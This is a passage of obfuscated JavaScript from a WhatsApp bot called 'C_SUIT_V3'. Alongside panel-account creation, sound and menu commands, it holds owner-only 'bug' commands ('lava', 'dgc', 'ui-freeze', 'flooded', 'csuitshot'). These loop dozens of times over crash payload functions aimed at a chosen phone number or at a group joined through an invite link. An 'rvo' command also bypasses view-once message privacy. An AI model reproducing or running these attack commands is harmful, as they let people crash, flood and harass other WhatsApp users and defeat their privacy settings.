              'email': _0x3af399,
              'username': _0x2598f1,
              'first_name': _0x2598f1,
              'last_name': _0x2598f1,
              'language': 'en',
              'password': _0x2d828f
            })
          });
          let _0x4599e2 = await _0x46a30a.json();
          if (_0x4599e2.errors) {
            return _0x4242ca(JSON.stringify(_0x4599e2.errors[0x0], null, 0x2));
          }
          let _0x197858 = _0x4599e2.attributes;
          let _0x57d2c2 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x18aaf6, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x4242ca("SUCCESSFULLY CREATED USER ID: " + _0x197858.id);
          ctf = "Hi @" + _0x673a10.split`@`[0x0] + "\n\n*Username* : " + _0x197858.username + "\n*Password* : " + _0x2d828f + "\n*Login* : " + domain + "\n\n_*NOTE :*_\n_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_\n > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS\n\n_*YouTube: youtube.com/@lostboy-tch*_\n\n_*Telegram: t.me/lostboytech12*_\n";
          _0x239047.sendMessage(_0x673a10, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x239047.chat
          });
          let _0x9d5938 = await _0x57d2c2.json();
          let _0x8c3aa1 = _0x9d5938.attributes.startup;
          let _0x1d3699 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2566e9,
              'description': " ",
              'user': _0x197858.id,
              'egg': parseInt(_0x18aaf6),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x8c3aa1,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "7158",
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': '200'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x34f87b)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x302a10 = await _0x1d3699.json();
          if (_0x302a10.errors) {
            return _0x4242ca(JSON.stringify(_0x302a10.errors[0x0], null, 0x2));
          }
        }
        break;
      case "unli":
        {
          if (!_0x2fc88e && !_0x11eb7e) {
            return _0x4242ca("Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner ");
          }
          let _0x1d82d9 = _0x208b05.split(',');
          if (_0x1d82d9.length < 0x2) {
            return _0x4242ca("*Wrong format!*\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " user,number");
          }
          let _0x47cba6 = _0x1d82d9[0x0];
          let _0x3003df = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x1d82d9[0x1] ? _0x1d82d9[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x5f530e.mentionedJid[0x0];
          let _0x530b77 = _0x47cba6 + 'Unli';
          let _0x213c5c = global.eggsnya;
          let _0x27a4e7 = global.location;
          let _0x3951f9 = _0x47cba6 + '1398@gmail.com';
          akunlo = 'https://files.catbox.moe/sc7oci.jpg';
          if (!_0x3003df) {
            return;
          }
          let _0x2c7896 = _0x47cba6 + '001';
          let _0x3ab680 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x3951f9,
              'username': _0x47cba6,
              'first_name': _0x47cba6,
              'last_name': _0x47cba6,
              'language': 'en',
              'password': _0x2c7896
            })
          });
          let _0x5c396f = await _0x3ab680.json();
          if (_0x5c396f.errors) {
            return _0x4242ca(JSON.stringify(_0x5c396f.errors[0x0], null, 0x2));
          }
          let _0x1c2b3c = _0x5c396f.attributes;
          let _0x556370 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x213c5c, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x4242ca("SUCCESSFULLY CREATED USER ID: " + _0x1c2b3c.id);
          ctf = "Hi @" + _0x3003df.split`@`[0x0] + "\n\n*Username* : " + _0x1c2b3c.username + "\n*Password* : " + _0x2c7896 + "\n*Login* : " + domain + "\n\n_*NOTE :*_\n_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_\n> DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS\n\n_*YouTube: youtube.com/@lostboy-tch*_\n\n_*Telegram: t.me/lostboytech12*_\n";
          _0x239047.sendMessage(_0x3003df, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x239047.chat
          });
          let _0x1af018 = await _0x556370.json();
          let _0x65b741 = _0x1af018.attributes.startup;
          let _0x2caa47 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x530b77,
              'description': " ",
              'user': _0x1c2b3c.id,
              'egg': parseInt(_0x213c5c),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x65b741,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '0',
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': '0'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x27a4e7)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2df115 = await _0x2caa47.json();
          if (_0x2df115.errors) {
            return _0x4242ca(JSON.stringify(_0x2df115.errors[0x0], null, 0x2));
          }
        }
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case 'sound5':
      case 'sound6':
      case 'sound7':
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case 'sound12':
      case "sound13":
      case "sound14":
      case "sound15":
      case 'sound16':
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case 'sound24':
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case 'sound29':
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case 'sound38':
      case "sound39":
      case "sound40":
      case 'sound41':
      case "sound42":
      case 'sound43':
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case 'sound53':
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case 'sound61':
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case 'sound76':
      case "sound77":
      case "sound78":
      case 'sound79':
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case 'sound86':
      case 'sound87':
      case "sound88":
      case "sound89":
      case "sound90":
      case "sound91":
      case 'sound92':
      case "sound93":
      case "sound94":
      case 'sound95':
      case 'sound96':
      case "sound97":
      case "sound98":
      case "sound99":
      case "sound100":
      case 'sound101':
      case 'sound102':
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case 'sound110':
      case 'sound111':
      case "sound112":
      case "sound113":
      case "sound114":
      case "sound115":
      case 'sound116':
      case "sound117":
      case "sound118":
      case "sound119":
      case 'sound120':
      case "sound121":
      case "sound122":
      case "sound123":
      case 'sound124':
      case 'sound125':
      case "sound126":
      case "sound127":
      case "sound128":
      case 'sound129':
      case "sound130":
      case "sound131":
      case "sound132":
      case 'sound133':
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case "sound138":
      case "sound139":
      case "sound140":
      case 'sound141':
      case "sound142":
      case "sound143":
      case 'sound144':
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case 'sound149':
      case "sound150":
      case "sound151":
      case "sound152":
      case 'sound153':
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case 'sound159':
      case 'sound160':
      case "sound161":
        _0x239047._dev = await getBuffer('https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/' + _0x418bf4 + ".mp3");
        await _0x239047.sendMessage(_0x5f530e.chat, {
          'audio': _0x239047._dev,
          'mimetype': "audio/mp4",
          'ptt': true
        }, {
          'quoted': _0x5f530e
        });
        break;
      case "lostboyhit":
      case 'lava':
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '💀',
              'key': _0x5f530e.key
            }
          });
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          if (!q) {
            return _0x4242ca("Example: " + (_0x1e0f65 + _0x418bf4) + " 233###\n> ONLY USE THIS COMMAND IN PERSON \n> ALSO DONT ADD AMOUNT JUST NUMBER");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          for (let _0x590f92 = 0x0; _0x590f92 < 0x46; _0x590f92++) {
            await _0x41f24d(target, true);
            await _0x31d6bd(target, true);
            await _0x31d6bd(target, true);
            await _0x38c57b(target, true);
            await _0x50fe66(target, true);
            await _0x34c90a(target, true);
            await _0x41f24d(target, true);
            await _0x31d6bd(target, true);
            await _0x31d6bd(target, true);
            await _0x38c57b(target, true);
            await _0x50fe66(target, true);
            await _0x34c90a(target, true);
          }
          _0x4242ca("\n🦣 *CSUIT* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈\n━━━━━━━━━━━━━━━━━━━━━━\n߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗\n᪣ 𝐔𝐒𝐈𝐍𝐆 : " + _0x418bf4 + "\n━━━━━━━━━━━━━━━━━━━━━━\n   ");
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': bug,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x1ad93b
          });
        }
        break;
      case 'dgc':
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '💀',
              'key': _0x5f530e.key
            }
          });
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          if (!q) {
            return _0x4242ca("Use ." + _0x418bf4 + " https://chat.whatsapp.com/");
          }
          _0x4242ca("</> Bugs have been sent... ");
          let _0x7da582 = _0x4376c7[0x0].split('https://chat.whatsapp.com/')[0x1];
          let _0x2c07bb = await _0x239047.groupAcceptInvite(_0x7da582);
          for (let _0x340095 = 0x0; _0x340095 < 0x46; _0x340095++) {
            await _0x29b414(_0x2c07bb, true);
            await sleep(0xa);
            await _0x50fe66(_0x2c07bb, true);
          }
          _0x4242ca("\n🦣 *CSUIT* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈\n━━━━━━━━━━━━━━━━━━━━━━\n߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : " + _0x2c07bb + "\n֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗\n᪣ 𝐔𝐒𝐈𝐍𝐆 : " + _0x418bf4 + "\n━━━━━━━━━━━━━━━━━━━━━━\n   ");
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': bug,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x1ad93b
          });
        }
        break;
        break;
      case "lord":
      case "ui-freeze":
      case "flooded":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '💀',
              'key': _0x5f530e.key
            }
          });
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          if (!q) {
            return _0x4242ca("Example: " + (_0x1e0f65 + _0x418bf4) + " 233###");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          for (let _0x396928 = 0x0; _0x396928 < 0x46; _0x396928++) {
            await _0x41f24d(target, true);
            await _0x2e0093(target, true);
            await _0x34c90a(target, true);
            await _0x2844c8(target, true);
            await _0x2e0093(target, true);
            await _0x34c90a(target, true);
          }
          _0x4242ca("\n🦣 *CSUIT* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈\n━━━━━━━━━━━━━━━━━━━━━━\n߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗\n᪣ 𝐔𝐒𝐈𝐍𝐆 : " + _0x418bf4 + "\n━━━━━━━━━━━━━━━━━━━━━━\n   ");
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': bug,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x1ad93b
          });
        }
        break;
      case "csuitshot":
      case 'p1':
      case 'penetrate':
      case 'tackle':
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          for (let _0xbaf7d5 = 0x0; _0xbaf7d5 < 0x1e; _0xbaf7d5++) {
            await _0x31d6bd(_0x5f530e.chat, _0x239047, ptcp = true);
            await _0x41f24d(_0x5f530e.chat, _0x239047, ptcp = true);
            await _0x2e0093(_0x5f530e.chat, _0x239047, ptcp = true);
            await _0x34c90a(_0x5f530e.chat, _0x239047, ptcp = true);
            await _0x2844c8(_0x5f530e.chat, _0x239047, ptcp = true);
          }
        }
        break;
      case "readviewonce":
      case "rvo":
        {
          if (!_0x5f530e.quoted) {
            return _0x4242ca("Reply to view once message");
          }
          if (_0x5f530e.quoted.mtype !== "viewOnceMessageV2") {
            return _0x4242ca("This is not a view once message");
          }
          let _0x4f18f3 = _0x5f530e.quoted.message;
          let _0x299045 = Object.keys(_0x4f18f3)[0x0];
          let _0xf11521 = await downloadContentFromMessage(_0x4f18f3[_0x299045], _0x299045 == 'imageMessage' ? "image" : "video");
          let _0x3e11a3 = Buffer.from([]);
          for await (const _0x1aacf1 of _0xf11521) {
            _0x3e11a3 = Buffer.concat([_0x3e11a3, _0x1aacf1]);
          }
          if (/video/.test(_0x299045)) {
            return _0x239047.sendFile(_0x5f530e.chat, _0x3e11a3, "media.mp4", _0x4f18f3[_0x299045].caption || '', _0x5f530e);
          } else {
            if (/image/.test(_0x299045)) {
              return _0x239047.sendFile(_0x5f530e.chat, _0x3e11a3, "media.jpg", _0x4f18f3[_0x299045].caption || '', _0x5f530e);
            }
          }
        }
        break;
      case "clearchat":
        _0x4242ca("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
        break;
      case "menu2":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '💀',
              'key': _0x5f530e.key
            }
          });
          let _0x5ba888 = "C_SUIT_V3🔥\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*    \n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄\n> 𝙵𝚄𝙽 𝙼𝙴𝙽𝚄\n> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄\n> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄\n> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄\n> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄\n> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄\n> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄\n> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄\n> 𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄.\n> 𝙼𝙴𝙽𝚄2\n> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄2\n> 𝙵𝚄𝙽𝙼𝙴𝙽𝚄 2\n> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄2\n> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄2\n> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄2\n> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄2\n> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝙽𝚄2\n> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄2\n> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄2\n\n\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ \n☞ *BY* ᒪOᔕTᗷOY\n╚════════════════════";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': fs.readFileSync("./C-SMedia/menu2.jpg"),
            'caption': _0x5ba888
          }, {
            'quoted': _0x5f530e
          });
          _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mp4",
            'ptt': true
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "csuitmenu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '🤪',
              'key': _0x5f530e.key
            }
          });
          const _0x49ca08 = "\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*    \n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? 'Premium' : 'Free') + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄\n> 𝙵𝚄𝙽 𝙼𝙴𝙽𝚄\n> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄\n> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄\n> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄\n> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄\n> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄\n> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄\n> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄\n> 𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄.\n> 𝙼𝙴𝙽𝚄2\n> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄2\n> 𝙵𝚄𝙽𝙼𝙴𝙽𝚄 2\n> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄2\n> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄2\n> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄2\n> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄2\n> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝙽𝚄2\n> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄2\n> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄2\n\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ \n☞ *BY* ᒪOᔕTᗷOY\n╚════════════════════";
          if (typemenu === 'v1') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'text': _0x49ca08,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': "https://files.catbox.moe/0i4wiu.png",
                  'sourceUrl': link,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v2') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync("./C-SMedia/11.mp3"),
                'gifPlayback': true,
                'caption': _0x49ca08,
                'contextInfo': {
                  'externalAdReply': {
                    'title': botname,
                    'body': ownername,
                    'thumbnailUrl': 'https://files.catbox.moe/0i4wiu.png',
                    'sourceUrl': '',
                    'mediaType': 0x1,
                    'renderLargerThumbnail': true
                  }
                }
              }, {
                'quoted': _0x5f530e
              });
            } else {
              if (typemenu === 'v3') {
                _0x239047.sendMessage(_0x5f530e.chat, {
                  'video': fs.readFileSync("./C-SMedia/11.mp3"),
                  'caption': _0x49ca08,
                  'gifPlayback': true
                }, {
                  'quoted': _0x5f530e
                });
              } else if (typemenu === 'v4') {
                _0x239047.relayMessage(_0x5f530e.chat, {
                  'scheduledCallCreationMessage': {
                    'callType': "AUDIO",
                    'scheduledTimestampMs': 0x4b0,
                    'title': _0x49ca08
                  }
                }, {});
              }
            }
          }
          break;
        }
      case "creampiemenu2":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '💦',
              'key': _0x5f530e.key
            }
          });
          const _0x3e975b = "\n𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? 'Premium' : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n  ᑕᖇᗴᗩᗰᑭIᗴ ᗰᗴᑎᑌ\n\n> 𝙷𝙽𝙴𝙺𝙾\n> 𝚃𝚁𝙰𝙿\n> 𝙶𝙸𝙵𝙱𝙻𝙾𝚆𝙹𝙾𝙱\n> 𝙰𝙽𝙸𝙼𝙴𝚂𝙿𝙰𝙽𝙺\n> 𝙽𝚆𝙰𝙸𝙵𝚄\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3 ▇ ▆ ▅ ▄ ▂ \n☞ *BY* ᒪOᔕTᗷOY \n╚════════════════════";
          if (typemenu === 'v1') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'text': _0x3e975b,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': "https://files.catbox.moe/0i4wiu.png",
                  'sourceUrl': link,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v2') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync("./C-SMedia/11.mp3"),
                'gifPlayback': true,
                'caption': _0x3e975b,
                'contextInfo': {
                  'externalAdReply': {
                    'title': botname,
                    'body': ownername,
                    'thumbnailUrl': "https://files.catbox.moe/0i4wiu.png",
                    'sourceUrl': '',
                    'mediaType': 0x1,
                    'renderLargerThumbnail': true
                  }
                }
              }, {
                'quoted': _0x5f530e
              });
            } else {
              if (typemenu === 'v3') {
                _0x239047.sendMessage(_0x5f530e.chat, {
                  'video': fs.readFileSync("./C-SMedia/11.mp3"),
                  'caption': _0x3e975b,
                  'gifPlayback': true
                }, {
                  'quoted': _0x5f530e
                });
              } else if (typemenu === 'v4') {
                _0x239047.relayMessage(_0x5f530e.chat, {
                  'scheduledCallCreationMessage': {
                    'callType': "AUDIO",
                    'scheduledTimestampMs': 0x4b0,
                    'title': _0x3e975b
                  }
                }, {});
              }
            }
          }
          break;
        }
      case "funmenu2":
        xmenu_oh = "\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*               \n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᖴᑌᑎ ᗰᗴᑎᑌ \n \n> 𝙲𝙴𝙲𝙰𝙽-𝙸𝙽𝙳𝙾\n> 𝙴𝙽𝙲𝙾𝙳𝙴\n> 𝚂𝚂\n> 𝙴𝙽𝙲𝚁𝚈𝙿𝚃\n> 𝚁𝙿𝚂\n> 𝚅𝚅\n> 𝚅𝚅𝟸\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ \n☞ *BY* ᒪOᔕTᗷOY ";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://files.catbox.moe/0i4wiu.png",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync('./C-SMedia/11.mp3'),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': 'https://files.catbox.moe/0i4wiu.png',
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync('./C-SMedia/11.mp3'),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': "AUDIO",
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "bugmenu2":
